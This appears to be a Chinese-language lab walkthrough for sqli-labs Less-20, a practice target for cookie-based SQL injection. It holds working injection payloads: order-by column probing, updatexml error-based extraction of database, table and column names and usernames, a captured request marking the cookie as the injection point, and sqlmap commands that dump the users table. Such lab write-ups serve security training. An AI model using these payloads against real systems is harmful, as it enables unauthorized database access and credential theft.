@@ -1,0 +1,44 @@
+<hr>
+<h2 id="title-less20url-https-www-yuque-com-u29002979-ep2zrx-yc18zmyfnsngbbzu"><a href="#title-less20url-https-www-yuque-com-u29002979-ep2zrx-yc18zmyfnsngbbzu" class="headerlink" title="title: less20url: https://www.yuque.com/u29002979/ep2zrx/yc18zmyfnsngbbzu"></a>title: less20<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/yc18zmyfnsngbbzu">https://www.yuque.com/u29002979/ep2zrx/yc18zmyfnsngbbzu</a></h2><pre><code class="bash">$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+$sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;
+</code></pre>
+<p>登录之后发现有很明显的<strong>cookie</strong>提示</p>
+<blockquote>
+<p>YOUR USER AGENT IS : Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.0.0 Safari&#x2F;537.36<br>YOUR IP ADDRESS IS : 192.168.31.119<br>DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE<br>YOUR COOKIE : uname &#x3D; admin and expires: Wed 16 Nov 2022 - 19:23:44<br>Your Login name:admin<br>Your Password:admin<br>Your ID:8</p>
+</blockquote>
+<p>登录之后刷新页面，一定要保证cookie还在存在的前提下进行抓包 &amp;#x20;<br><code>uname = admin&#39; order by 3-- +</code><br><code>uname=admin&#39; order by 4-- +</code></p>
+<blockquote>
+<p>Issue with your mysql: Unknown column ‘4’ in ‘order clause’</p>
+</blockquote>
+<p>3个字段数 <a name="NTGzZ"></a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><a name="X6iZN"></a></p>
+<h2 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h2><p><code>uname=admin&#39; union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)--+</code> <a name="DoliG"></a></p>
+<h2 id="爆破数据表名"><a href="#爆破数据表名" class="headerlink" title="爆破数据表名"></a>爆破数据表名</h2><p><code>uname=admin&#39; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)--+</code> <a name="zblHG"></a></p>
+<h2 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h2><p><code>uname=admin&#39; union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; limit 8,1),0x7e),1)-- +</code> <a name="IHMXL"></a></p>
+<h2 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h2><p><code>uname=admin&#39; union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +</code></p>
+<p><a name="Ea4Mq"></a></p>
+<h1 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h1><pre><code class="bash">POST /less-20/index.php HTTP/1.1
+Host: 192.168.31.193
+Content-Length: 0
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
+Origin: http://192.168.31.193
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.31.193/less-20/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uname=admin*
+Connection: close
+</code></pre>
+<p>打上*  level 等级2</p>
+<pre><code class="bash">检测注入点
+sqlmap -r 3.txt --batch --level 2
+爆破数据库名
+sqlmap -r 3.txt --batch --level 2 --current-db
+爆破数据表名
+sqlmap -r 3.txt --batch --level 2 -D &quot;security&quot; --tables
+爆破字段内容
+sqlmap -r 3.txt --batch --level 2 -D &quot;security&quot; -T &quot;users&quot; --dump
+</code></pre>
